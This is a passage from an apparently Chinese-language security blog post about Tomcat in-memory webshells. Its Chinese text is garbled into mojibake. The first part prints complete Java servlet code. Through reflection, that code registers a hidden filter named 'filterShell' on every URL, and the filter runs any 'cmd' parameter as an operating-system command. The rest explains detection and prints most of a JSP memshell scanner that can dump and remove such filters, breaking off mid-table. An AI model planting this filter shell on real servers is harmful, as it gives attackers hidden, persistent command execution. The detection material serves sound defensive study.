Constructor\u0026lt;?\u0026gt; declaredConstructor1 = FilterMap.getDeclaredConstructor(); org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap) declaredConstructor1.newInstance(); o1.addURLPattern(\u0026#34;/*\u0026#34;); o1.setFilterName(FilterName); o1.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(o1);   5. å°†å°†ServletContextå¯¹è±¡ã€è‡ªå®šä¹‰çš„filterå¯¹è±¡ã€FilterDefå…¨éƒ¨éƒ½è®¾ç½®åˆ°filterConfigsä¸­ 1 2 3 4 5 6 7 8 9 10 11  // åå°„è·å–ApplicationFilterConfig,æ„é€ æ–¹æ³•å°†FilterDefä¼ å…¥åè·å–filterConfigåï¼Œå°†è®¾ç½®å¥½çš„filterConfigæ·»åŠ è¿›å»  Class\u0026lt;?\u0026gt; ApplicationFilterConfig = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class); declaredConstructor2.setAccessible(true); ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext,o); filterConfigs.put(FilterName,filterConfig); resp.getWriter().write(\u0026#34;Success\u0026#34;); }   å®Œæ•´ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143  package com.crkmythical.tomcatshell; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.ApplicationFilterConfig; import org.apache.catalina.core.StandardContext; import org.apache.tomcat.util.descriptor.web.FilterDef; import org.apache.tomcat.util.descriptor.web.FilterMap; import org.apache.catalina.Context; import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.util.Map; import java.util.Scanner; /** * @Author: crkmyth1cal * @Github: https://github.com/crkmyth1cal * @Blog: https://crkmyth1cal.github.io * @Date: 2022 - 07 - 21 - 14:49 * @Description: {tomcatShell} * @version: 1.0 */ @WebServlet(name = \u0026#34;demoServlet\u0026#34;, urlPatterns = \u0026#34;/demoServlet\u0026#34;) public class demoServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { Field Configs =null; Map filterConfigs; try { //è¿™é‡Œæ˜¯åå°„è·å–ApplicationContextçš„contextï¼Œä¹Ÿå°±æ˜¯standardContext  // ServletContext servletContext1 = req.getSession().getServletContext();  ServletContext servletContext = req.getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctx.setAccessible(true); // resp.getWriter().println(appctx);  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); String FilterName = \u0026#34;filterShell\u0026#34;; Configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); Configs.setAccessible(true); filterConfigs = (Map)Configs.get(standardContext); if ( filterConfigs.get(FilterName) == null ){ // åˆ›å»ºfilterç±»å‹å†…å­˜é©¬  Filter filterShell =new Filter(){ @Override public void init(FilterConfig filterConfig) throws ServletException { Filter.super.init(filterConfig); } @Override public void destroy() { Filter.super.destroy(); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; if( request.getParameter(\u0026#34;cmd\u0026#34;) != null ){ boolean isLinux=true; String osType = System.getProperty(\u0026#34;os.name\u0026#34;); if ( osType !=null \u0026amp;\u0026amp; osType.toLowerCase().contains(\u0026#34;win\u0026#34;)){ isLinux =false; } String[] cmds= isLinux ? new String[]{\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;, request.getParameter(\u0026#34;cmd\u0026#34;)} : new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;, request.getParameter(\u0026#34;cmd\u0026#34;)}; InputStream inputStream = Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;)).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\u0026#34;\\\\A\u0026#34;); String result = scanner.hasNext() ? scanner.next() : \u0026#34;\u0026#34;; response.getWriter().println(result); return; } filterChain.doFilter(request,response); } }; // åå°„è·å–FilterDefï¼Œ è®¾ç½®filteråç­‰å‚æ•°åï¼Œè°ƒç”¨addFilterDefå°†FilterDefæ·»åŠ   Class\u0026lt;?\u0026gt; FilterDef = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = FilterDef.getDeclaredConstructor(); FilterDef o =(FilterDef) declaredConstructor.newInstance(); o.setFilter(filterShell); o.setFilterName(FilterName); o.setFilterClass(filterShell.getClass().getName()); standardContext.addFilterDef(o); // åå°„è·å–FilterMapå¹¶ä¸”è®¾ç½®æ‹¦æˆªè·¯å¾„ï¼Œå¹¶è°ƒç”¨addFilterMapBeforeå°†FilterMapæ·»åŠ è¿›å»  Class\u0026lt;?\u0026gt; FilterMap = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor1 = FilterMap.getDeclaredConstructor(); org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap) declaredConstructor1.newInstance(); o1.addURLPattern(\u0026#34;/*\u0026#34;); o1.setFilterName(FilterName); o1.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(o1); // åå°„è·å–ApplicationFilterConfig,æ„é€ æ–¹æ³•å°†FilterDefä¼ å…¥åè·å–filterConfigåï¼Œå°†è®¾ç½®å¥½çš„filterConfigæ·»åŠ è¿›å»  Class\u0026lt;?\u0026gt; ApplicationFilterConfig = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class); declaredConstructor2.setAccessible(true); ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext,o); filterConfigs.put(FilterName,filterConfig); resp.getWriter().write(\u0026#34;Success\u0026#34;); } } catch (Exception e) { // getDeclaredField(\u0026#34;context\u0026#34;);  e.printStackTrace(); } } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { this.doGet(req,resp); } }   å†…å­˜é©¬æ£€æµ‹ä¸æ’æŸ¥ æºç æ£€æµ‹ åœ¨Javaä¸­ï¼Œåªæœ‰è¢«JVMåŠ è½½/æˆ–åœ¨éœ€è¦æ—¶é€šè¿‡åå°„é€šçŸ¥JVMåŠ è½½çš„ç±»æ‰èƒ½è¢«è°ƒç”¨ã€‚æ‰€æœ‰çš„ç‰¹å¾éƒ½åœ¨å†…å­˜ä¸­ï¼Œè¡¨ç°å½¢å¼ä¸ºè¢«åŠ è½½çš„classï¼Œéœ€è¦é€šè¿‡æŸç§æ–¹æ³•è·å–åˆ°JVMè¿è¡Œæ—¶å†…å­˜ä¸­å·²åŠ è½½çš„ç±»ã€‚\nJavaæœ¬èº«æä¾›äº†Instrumentationç±»æ¥å®ç°\nå®ç°æ€è·¯ï¼š\n æ³¨å…¥jaråŒ… \u0026ndash;\u0026gt;dumpå·²åŠ è½½classå­—èŠ‚ç  \u0026ndash;\u0026gt; åç¼–è¯‘æˆjavaä»£ç  \u0026ndash;\u0026gt; æºç webshellæ£€æµ‹\n æ£€æµ‹åˆ¤å®šï¼š\n æ–°å¢æˆ–ä¿®æ”¹çš„ç±» æ²¡æœ‰å¯¹åº”classæ–‡ä»¶çš„ç±» xmlé…ç½®ä¸­æ²¡æœ‰æ³¨å†Œçš„ å†°èç­‰å¸¸è§å·¥å…·ä½¿ç”¨çš„ç±» filterchainä¸­æ’ç¬¬ä¸€çš„filterç±»  æœ‰ä¸€äº›å·¥å…·å¯ä»¥è¾…åŠ©æ£€æµ‹å†…å­˜é©¬ï¼Œå¦‚java-memshell-scanneræ˜¯é€šè¿‡jspæ‰«æåº”ç”¨ä¸­æ‰€æœ‰çš„filterå’Œservletï¼Œç„¶åé€šè¿‡åç§°ã€å¯¹åº”çš„classæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å†…å­˜é©¬ã€‚\nå†…å­˜é©¬æ£€æµ‹java-memshell-scanner åˆ›å»ºmemshell-scanner.jsp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376  \u0026lt;%-- Created by IntelliJ IDEA. User: ding.fugui Date: 7/20/22 Time: 14:35 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URL\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.HashMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;com.sun.org.apache.bcel.internal.Repository\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URLEncoder\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardWrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Method\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.ArrayList\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.concurrent.CopyOnWriteArrayList\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;tomcat-memshell-killer\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%! public Object getStandardContext(HttpServletRequest request) throws NoSuchFieldException, IllegalAccessException { Object context = request.getSession().getServletContext(); Field _context = context.getClass().getDeclaredField(\u0026#34;context\u0026#34;); _context.setAccessible(true); Object appContext = _context.get(context); Field __context = appContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); __context.setAccessible(true); Object standardContext = __context.get(appContext); return standardContext; } public HashMap\u0026lt;String, Object\u0026gt; getFilterConfig(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _filterConfigs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); _filterConfigs.setAccessible(true); HashMap\u0026lt;String, Object\u0026gt; filterConfigs = (HashMap\u0026lt;String, Object\u0026gt;) _filterConfigs.get(standardContext); return filterConfigs; } // FilterMap[]  public Object[] getFilterMaps(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _filterMaps = standardContext.getClass().getDeclaredField(\u0026#34;filterMaps\u0026#34;); _filterMaps.setAccessible(true); Object filterMaps = _filterMaps.get(standardContext); Object[] filterArray = null; try { // tomcat 789  Field _array = filterMaps.getClass().getDeclaredField(\u0026#34;array\u0026#34;); _array.setAccessible(true); filterArray = (Object[]) _array.get(filterMaps); } catch (Exception e) { // tomcat 6  filterArray = (Object[]) filterMaps; } return filterArray; } /** * é—ç•™é—®é¢˜,getFilterConfig()ä¾ç„¶å­˜åœ¨2ä¸ª * @param request * @param filterName * @throws Exception */ public synchronized void deleteFilter(HttpServletRequest request, String filterName) throws Exception { Object standardContext = getStandardContext(request); // org.apache.catalina.core.StandardContext#removeFilterDef  HashMap\u0026lt;String, Object\u0026gt; filterConfig = getFilterConfig(request); Object appFilterConfig = filterConfig.get(filterName); Field _filterDef = appFilterConfig.getClass().getDeclaredField(\u0026#34;filterDef\u0026#34;); _filterDef.setAccessible(true); Object filterDef = _filterDef.get(appFilterConfig); Class clsFilterDef = null; try { // Tomcat 8  clsFilterDef = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34;); } catch (Exception e) { // Tomcat 7  clsFilterDef = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterDef\u0026#34;); } Method removeFilterDef = standardContext.getClass().getDeclaredMethod(\u0026#34;removeFilterDef\u0026#34;, new Class[]{clsFilterDef}); removeFilterDef.setAccessible(true); removeFilterDef.invoke(standardContext, filterDef); // org.apache.catalina.core.StandardContext#removeFilterMap  Class clsFilterMap = null; try { // Tomcat 8  clsFilterMap = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); } catch (Exception e) { // Tomcat 7  clsFilterMap = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34;); } Object[] filterMaps = getFilterMaps(request); for (Object filterMap : filterMaps) { Field _filterName = filterMap.getClass().getDeclaredField(\u0026#34;filterName\u0026#34;); _filterName.setAccessible(true); String filterName0 = (String) _filterName.get(filterMap); if (filterName0.equals(filterName)) { Method removeFilterMap = standardContext.getClass().getDeclaredMethod(\u0026#34;removeFilterMap\u0026#34;, new Class[]{clsFilterMap}); removeFilterDef.setAccessible(true); removeFilterMap.invoke(standardContext, filterMap); } } } public synchronized void deleteServlet(HttpServletRequest request, String servletName) throws Exception { HashMap\u0026lt;String, Object\u0026gt; childs = getChildren(request); Object objChild = childs.get(servletName); String urlPattern = null; HashMap\u0026lt;String, String\u0026gt; servletMaps = getServletMaps(request); for (Map.Entry\u0026lt;String, String\u0026gt; servletMap : servletMaps.entrySet()) { if (servletMap.getValue().equals(servletName)) { urlPattern = servletMap.getKey(); break; } } if (urlPattern != null) { // åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeServletMapping  Object standardContext = getStandardContext(request); Method removeServletMapping = standardContext.getClass().getDeclaredMethod(\u0026#34;removeServletMapping\u0026#34;, new Class[]{String.class}); removeServletMapping.setAccessible(true); removeServletMapping.invoke(standardContext, urlPattern); // Tomcat 6å¿…é¡»removeChild 789å¯ä»¥ä¸ç”¨  // åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeChild  Method removeChild = standardContext.getClass().getDeclaredMethod(\u0026#34;removeChild\u0026#34;, new Class[]{org.apache.catalina.Container.class}); removeChild.setAccessible(true); removeChild.invoke(standardContext, objChild); } } public synchronized HashMap\u0026lt;String, Object\u0026gt; getChildren(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _children = standardContext.getClass().getSuperclass().getDeclaredField(\u0026#34;children\u0026#34;); _children.setAccessible(true); HashMap\u0026lt;String, Object\u0026gt; children = (HashMap\u0026lt;String, Object\u0026gt;) _children.get(standardContext); return children; } public synchronized HashMap\u0026lt;String, String\u0026gt; getServletMaps(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _servletMappings = standardContext.getClass().getDeclaredField(\u0026#34;servletMappings\u0026#34;); _servletMappings.setAccessible(true); HashMap\u0026lt;String, String\u0026gt; servletMappings = (HashMap\u0026lt;String, String\u0026gt;) _servletMappings.get(standardContext); return servletMappings; } public synchronized List\u0026lt;Object\u0026gt; getListenerList(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _listenersList = standardContext.getClass().getDeclaredField(\u0026#34;applicationEventListenersList\u0026#34;); _listenersList.setAccessible(true); List\u0026lt;Object\u0026gt; listenerList = (CopyOnWriteArrayList) _listenersList.get(standardContext); return listenerList; } public String getFilterName(Object filterMap) throws Exception { Method getFilterName = filterMap.getClass().getDeclaredMethod(\u0026#34;getFilterName\u0026#34;); getFilterName.setAccessible(true); return (String) getFilterName.invoke(filterMap, null); } public String[] getURLPatterns(Object filterMap) throws Exception { Method getFilterName = filterMap.getClass().getDeclaredMethod(\u0026#34;getURLPatterns\u0026#34;); getFilterName.setAccessible(true); return (String[]) getFilterName.invoke(filterMap, null); } String classFileIsExists(Class clazz) { if (clazz == null) { return \u0026#34;class is null\u0026#34;; } String className = clazz.getName(); String classNamePath = className.replace(\u0026#34;.\u0026#34;, \u0026#34;/\u0026#34;) + \u0026#34;.class\u0026#34;; URL is = clazz.getClassLoader().getResource(classNamePath); if (is == null) { return \u0026#34;åœ¨ç£ç›˜ä¸Šæ²¡æœ‰å¯¹åº”classæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯å†…å­˜é©¬\u0026#34;; } else { return is.getPath(); } } String arrayToString(String[] str) { String res = \u0026#34;[\u0026#34;; for (String s : str) { res += String.format(\u0026#34;%s,\u0026#34;, s); } res = res.substring(0, res.length() - 1); res += \u0026#34;]\u0026#34;; return res; } %\u0026gt; \u0026lt;% out.write(\u0026#34;\u0026lt;h2\u0026gt;Tomcat memshell scanner 0.1.0\u0026lt;/h2\u0026gt;\u0026#34;); String action = request.getParameter(\u0026#34;action\u0026#34;); String filterName = request.getParameter(\u0026#34;filterName\u0026#34;); String servletName = request.getParameter(\u0026#34;servletName\u0026#34;); String className = request.getParameter(\u0026#34;className\u0026#34;); if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;kill\u0026#34;) \u0026amp;\u0026amp; filterName != null) { deleteFilter(request, filterName); } else if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;kill\u0026#34;) \u0026amp;\u0026amp; servletName != null) { deleteServlet(request, servletName); } else if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;dump\u0026#34;) \u0026amp;\u0026amp; className != null) { byte[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes(); response.addHeader(\u0026#34;content-Type\u0026#34;, \u0026#34;application/octet-stream\u0026#34;); String filename = Class.forName(className).getSimpleName() + \u0026#34;.class\u0026#34;; String agent = request.getHeader(\u0026#34;User-Agent\u0026#34;); if (agent.toLowerCase().indexOf(\u0026#34;chrome\u0026#34;) \u0026gt; 0) { response.addHeader(\u0026#34;content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + new String(filename.getBytes(\u0026#34;UTF-8\u0026#34;), \u0026#34;ISO8859-1\u0026#34;)); } else { response.addHeader(\u0026#34;content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + URLEncoder.encode(filename, \u0026#34;UTF-8\u0026#34;)); } ServletOutputStream outDumper = response.getOutputStream(); outDumper.write(classBytes, 0, classBytes.length); outDumper.close(); } else { // Scan filter  out.write(\u0026#34;\u0026lt;h4\u0026gt;Filter scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Filter name\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Patern\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Filter class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Filter classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;25%\\\u0026#34;\u0026gt;Filter class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); HashMap\u0026lt;String, Object\u0026gt; filterConfigs = getFilterConfig(request); Object[] filterMaps1 = getFilterMaps(request); for (int i = 0; i \u0026lt; filterMaps1.length; i++) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); Object fm = filterMaps1[i]; Object appFilterConfig = filterConfigs.get(getFilterName(fm)); if (appFilterConfig == null) { continue; } Field _filter = appFilterConfig.getClass().getDeclaredField(\u0026#34;filter\u0026#34;); _filter.setAccessible(true); Object filter = _filter.get(appFilterConfig); String filterClassName = filter.getClass().getName(); String filterClassLoaderName = filter.getClass().getClassLoader().getClass().getName(); // ID Filtername åŒ¹é…è·¯å¾„ className classLoader æ˜¯å¦å­˜åœ¨file dump kill  out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;filterName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , i + 1 , getFilterName(fm) , arrayToString(getURLPatterns(fm)) , filterClassName , filterClassLoaderName , classFileIsExists(filter.getClass()) , filterClassName , getFilterName(fm))); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); // Scan servlet  out.write(\u0026#34;\u0026lt;h4\u0026gt;Servlet scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Servlet name\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Patern\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Servlet class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Servlet classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;25%\\\u0026#34;\u0026gt;Servlet class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); HashMap\u0026lt;String, Object\u0026gt; children = getChildren(request); Map\u0026lt;String, String\u0026gt; servletMappings = getServletMaps(request); int servletId = 0; for (Map.Entry\u0026lt;String, String\u0026gt; map : servletMappings.entrySet()) { String servletMapPath = map.getKey(); String servletName1 = map.getValue(); StandardWrapper wrapper = (StandardWrapper) children.get(servletName1); Class servletClass = null; try { servletClass = Class.forName(wrapper.getServletClass()); } catch (Exception e) { Object servlet = wrapper.getServlet(); if (servlet != null) { servletClass = servlet.getClass(); } } if (servletClass != null) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); String servletClassName = servletClass.getName(); String servletClassLoaderName = null; try { servletClassLoaderName = servletClass.getClassLoader().getClass().getName(); } catch (Exception e) { } out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;servletName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , servletId + 1 , servletName1 , servletMapPath , servletClassName , servletClassLoaderName , classFileIsExists(servletClass) , servletClassName , servletName1)); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); } servletId++; } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); List\u0026lt;Object\u0026gt; listeners = getListenerList(request); if (listeners == null || listeners.size() == 0) { return; } out.write(\u0026#34;\u0026lt;tbody\u0026gt;\u0026#34;); List\u0026lt;ServletRequestListener\u0026gt; newListeners = new ArrayList\u0026lt;\u0026gt;(); for (Object o : listeners) { if (o instanceof ServletRequestListener) { newListeners.add((ServletRequestListener) o); } } // Scan listener  out.write(\u0026#34;\u0026lt;h4\u0026gt;Listener scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Listener 